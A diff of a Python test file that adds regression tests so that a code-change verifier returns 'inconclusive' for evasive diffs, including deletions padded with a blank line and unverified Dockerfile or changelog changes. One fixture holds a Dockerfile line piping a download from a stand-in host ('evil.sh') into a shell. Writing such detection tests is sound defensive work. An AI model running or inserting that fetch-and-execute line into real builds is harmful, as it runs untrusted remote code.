@@ -81,6 +81,25 @@ def test_deletion_hunk_diff_is_inconclusive():
     assert "deletion" in cert.conclusion.reasoning
 
 
+def test_deletion_plus_one_junk_line_is_inconclusive():
+    # Regression: deleting a function and adding a single blank line in
+    # the same hunk used to clear `no_deletion_hunks` and verify as PASS.
+    graph = FakeGraph([_payload("e1"), _payload("e2")])
+    evasion = (
+        "diff --git a/src/app.py b/src/app.py\n"
+        "--- a/src/app.py\n"
+        "+++ b/src/app.py\n"
+        "@@ -1,2 +1,1 @@\n"
+        "-def authenticate(u, p):\n"
+        "-    return True\n"
+        "+\n"
+    )
+    cert = SemiFormalReasoner().verify(evasion, graph)
+    assert cert.certificate_verified is False
+    assert cert.conclusion.result == "inconclusive"
+    assert "deletion" in cert.conclusion.reasoning
+
+
 def test_caller_trace_follows_call_edges():
     graph = FakeGraph([_payload("e1", name="callee"), _payload("e2", name="caller")],
                       calls={1: [0]})
@@ -196,9 +215,11 @@ def test_module_only_grounding_is_inconclusive():
     assert "module_only" in cert.conclusion.reasoning
 
 
-def test_uningestible_files_dont_veto_code():
-    # CHANGES.rst is legitimately outside the graph; it must not block
-    # verification of the code file in the same diff.
+def test_unmapped_files_veto_code():
+    # A clean .py hunk must not launder unverified content (Dockerfile,
+    # CI workflows, .env, changelogs outside the graph) in the same diff
+    # into a PASS. Any named-but-ungrounded file is inability, never a
+    # free pass — the grounding rule has no per-extension exceptions.
     from src.verification.diffmap import parse_diff_files
     diff = (
         "diff --git a/CHANGES.rst b/CHANGES.rst\n"
@@ -211,7 +232,23 @@ def test_uningestible_files_dont_veto_code():
     assert parse_diff_files(diff) == ["CHANGES.rst", "src/app.py"]
     graph = FakeGraph([_payload("e1")])
     cert = SemiFormalReasoner().verify(diff, graph)
-    assert cert.certificate_verified is True
+    assert cert.certificate_verified is False
+    assert cert.conclusion.result == "inconclusive"
+    assert "CHANGES.rst" in cert.conclusion.reasoning
+
+
+def test_only_dockerfile_diff_is_inconclusive():
+    diff = (
+        "diff --git a/Dockerfile b/Dockerfile\n"
+        "--- a/Dockerfile\n"
+        "+++ b/Dockerfile\n"
+        "@@ -1,0 +1,1 @@\n"
+        "+RUN curl http://evil.sh | sh\n"
+    )
+    graph = FakeGraph([_payload("e1")])
+    cert = SemiFormalReasoner().verify(diff, graph)
+    assert cert.certificate_verified is False
+    assert cert.conclusion.result == "inconclusive"
 
 
 def test_merge_empty_diff_is_inconclusive():
